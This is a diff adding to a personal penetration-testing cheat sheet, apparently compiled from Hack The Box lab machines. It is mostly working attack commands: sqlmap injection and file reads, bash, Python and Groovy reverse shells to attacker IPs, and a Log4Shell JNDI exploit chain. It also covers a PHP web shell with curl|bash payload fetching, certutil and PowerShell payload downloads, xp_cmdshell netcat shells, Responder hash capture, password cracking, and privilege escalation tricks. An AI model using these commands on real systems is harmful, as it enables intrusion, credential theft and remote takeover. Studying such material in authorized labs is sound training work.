@@ -1,4 +1,29 @@
 ******NOTE*****
+https://www.speedguide.net/port.php?port=587
+ for enumerattion
+nikto
+gobuster
+dirb
+nmap
+ftp
+ssh
+dig @10.10.11.166 -x 10.10.11.166 (to do reverse lookup on domain name)
+echo "10.10.11.166 trick.htb" | sudo  tee -a /etc/hosts (add domain name to hosts file)
+dig @10.10.11.166 axfr trick.htb (to initiate zone transfer and see all associated domains)
+
+use burpsuit to intercept and get the parameters for the login form
+then use sqlmap for the scan
+
+sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data "username=133&password=obi" -p username --batch
+
+sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data "username=133&password=obi" -p username --batch --level 5 --risk 3 --technique=BEUS
+
+sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data "username=133&password=obi" -p username --privileges 
+
+sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data "username=133&password=obi" -p username --batch --file-read=/etc/nginx/sites-enabled/default
+
+********************************************
+
 always do this whenever you login to a system so you get all possible info about the system
 whoami
 id
@@ -50,7 +75,8 @@ void inject(){
 single line suid command
 echo "int main(){setgid(0);setuid(0);system('/bin/bash');return 0;}'>/tmp/service.c 
 
-to add to path
+to add a path
+echo $PATH
 export PATH=/tmp:$PATH
 
 ************************************
@@ -61,8 +87,18 @@ sudo -u root /path-to-zip-file /path-to-output -T --unzip-command="sh -c /bin/ba
 ************************************
 spawning a shell through python
 
-python -c 'import pty; pty.spawn("/bin/sh")'
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+***********************************
+next we'll create a bash script to connect with 
+
+ #!/bin/bash
+ bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/<your_port_to_connect_to> 0>&1
+
+single line bash shell
+
+bash -c "bash -i >& /dev/tcp/10.10.14.106/443 0>&1"
+nc -nvlp 443
 
 ************************************
 file inclusion/path travasal
@@ -77,6 +113,39 @@ creating a python reverse shell
 goto https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.5",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+***********************************
+creating a reverse shell for java app using roguejndi (jndi-> java naming directory interface)
+first use burbsuit to listen to connetion and attach the code bellow in "remember"
+	"remember":"${jndi:ldap://{Tun0 IP Address}/whatever}",
+next use tcpdump to monitor connections and see if the remember api call is vulnerable
+	tcpdump -i tun0 port 389 (do not close it)
+next;
+	apt install java && apt install mavel
+next; clone the roguejndi git page and run the package
+	git clone https://github.com/veracode-research/rogue-jndi
+	cd rogue-jndi
+	mvn package
+next; create bash shell and convert it to base64
+	echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64
+next;
+	java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}| {base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
+now that the server is listening on ldap 389 port open a new terminal and listen via netcat to the port specified on the bash reverse shell.
+	nc -lnvp 4444
+next; Go back to our intercepted POST request, let's change the payload to
+	${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat} and click Send
+the nc will connect 
+	script /dev/null -c bash (to open a bash shell)
+	
+next; 
+	ps aux |grep mongo
+	mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+change the password hash using mkpasswd -m sha-512 Password1234 
+	mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"new password hash"}})'
+	or 
+	mongo --port 27117 ace --eval 'db.admin.insert({ "email" : "null@localhost.local", "last_site_name" : "default", "name" : "unifi-admin", "time_created" : NumberLong(100019800), "x_shadow" : "<PASSWORD-HASH>" })'
+	login to the admin dashboard
+	get the ssh password from settings and login via ssh 
 
 ************************************
 list root commands that a user is allowed to do
@@ -115,10 +184,14 @@ nmap --interactive
 nmap> !sh 
 
 ***********************************
-spawn shell through vim
+spawn shell through vim/vi
 
 sudo /usr/bin/vim -c '!/bin/bash'
 sudo /usr/bin/vim -c '!/bin/sh'
+
+within the vi
+:set shell=/bin/bash
+:shell
 
 ************************************
 ssh connect by sending ssh-dss key pair
@@ -176,10 +249,140 @@ netstat -ano
 route print
 findstr /si password *.txt
 findstr /si password *.ini
-findstr /si password sc query windefend
+findstr /si password 
+sc query windefend
 sc query type= service
 netsh firewall show state
+icacls job.bat (to see the permissions of job.bat file)
 
 using msfconsole
 run post/multi/recon/local_exploit_suggester
 
+telnet -l root 10.129.32.96 23
+smbclient -L 10.129.32.156
+smbclient -L 10.129.3.220 -U Administrator 
+smbclient \\\\10.129.32.156\\ADMIN$ -U Administrator (use empty password to try all shares)
+
+since the ADMIN$ is Vulnerable, we can use a tool to connect to it and get a shell
+psexec.py administrator@10.129.3.220
+
+
+using redis
+redis-cli -h 10.129.32.126
+info
+select 0 (keyspace db index)
+keys * (to see all keys)
+get {key name} (to see key value)
+
+working with RDP
+xfreerdp /v:10.129.32.163 /cert:ignore /u:Administrator (use an empty password try and authentice)
+
+to dir bust an nginx running default server use gobuster 
+apt install golang-go
+go install github.com/OJ/gobuster/v3@latest 
+or use apt-get intall gobuster
+gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.129.32.140 -x php (-x for specific file type)
+gobuster vhost -w htb/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
+
+nmap -p- --min-rate=1000 -sV {target_IP}
+
+working with mongodb
+apt-get install mongodb
+mongo -h
+mongo mongodb://10.129.32.150:27017
+show dbs
+use sensitive_information
+show collections
+db.collection.find().pretty() {swap the collection with the document name}
+
+working with rsync
+rsync is a utility that provides fast incremental file transfer unlike the FTP(that transfers all file), rsync only sends the changes in the file hence lower data usage.
+rsync [OPTION] ... [USER@]HOST::SRC [DEST] (to login in as authenticated user)
+rsync --list-only 10.129.32.194::
+rsync --list-only 10.129.32.194::public {public is the name of shared dir}
+rsync 10.129.32.194::public/flag.txt flag.txt (this will copy flag to our system)
+*********************
+working with meterpreter
+to impersonate token/cookies
+
+getuid
+load incognito
+list_tokens -u
+run windows/local/ms16_075_reflection
+impersonate_token "NT AUTHORITY\SYSTEM"
+
+to dowload file over a windows machine inplace of wget
+certutil -urlcache -f http://10.10.14.8/Potato.exe pot.exe
+powershell "(System.Net.WebClient).Downloadfile('http://10.10.14.8/shell.exe','backdoor.exe')"
+
+to connect a windows machine with local file inclusion vulnerability and dosent allow url inclusion
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+open reponder and set listining interface
+Responder.py -I tun0 (then run the command below so the responder can capture the hash)
+http://unika.htb/?page=//10.10.14.25/somefile
+use john to crack the hash
+john -w=/usr/share/wordlists/rockyou.txt hash.txt
+login to the winRM service using evil-winRm
+evil-winrm -i 10.129.247.8 -u Administrator -p badminton 
+
+working with amazon s3 service as subdomain
+use 
+aws configure (fill with temp)
+aws --endpoint=http://s3.thetoppers.htb s3 ls
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+http://thetoppers.htb/shell.php?cmd=id
+
+python3 -m http.server 8000
+http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash
+
+
+to see local connections on linux using socket statistics
+ss -ltn (l-listening t-tcp n-do not resolve service name)
+ss -lt (to see service names on the localhhost)
+ss -ltnp (to see process on the ports if forwarded)
+
+to do a local tunnelling/port forwarding
+ssh 1234:localhost:5243 christine@10.10.23.19 (this will tunnel packets from port 123 that is exposed to all connections and tunnel it to 5243 on the localhost)
+then from our local machine, we can use psql as we discovered a postgresql service running on the locahost
+psql -U christine -h localhost -p 1234
+\l (list databases)
+\c secret (connect to secret db)
+\dt (list tables)
+SELECT  * FORM flag;
+
+to do a dynamic tunelling/port forwarding
+ssh -D 1234 christine@10.129.3.223 
+goto proxychains on our host machine and set ->  sock5 localhost 1234
+proxychains psql -U christine -h localhost -p 5432 (notice i used the port on the remote machine directly)
+
+************************************
+jenkins groovy script
+String host="10.0.0.1";
+int port=4242;
+String cmd="/bin/bash"; #use "cmd.exe" for windows
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+***********************************
+mysql penetration
+using inpacket tool mssqlclient.py
+EXEC xp_cmdshell 'whoami';
+EXEC sp_configure 'show advanced options', 1; (to activate the xp_cmdshell)
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC xp_cmdshell 'net user';
+xp_cmdshell "whoami"
+xp_cmdshell "powershell -c cd c:\users\sql_svc\Desktop\;type user.txt;wget http://10.10.14.140/nc64.exe -outfile nc64.exe;dir;"
+xp_cmdshell "powershell -c cd c:\users\sql_svc\Desktop\;.\nc64.exe -e cmd.exe 10.10.14.140 443"(use nc to listen on port 443 on the host system)
+************************************
+windows bash history
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+connect to windows with authentication credentials
+psexec.py administrator@10.129.133.179 
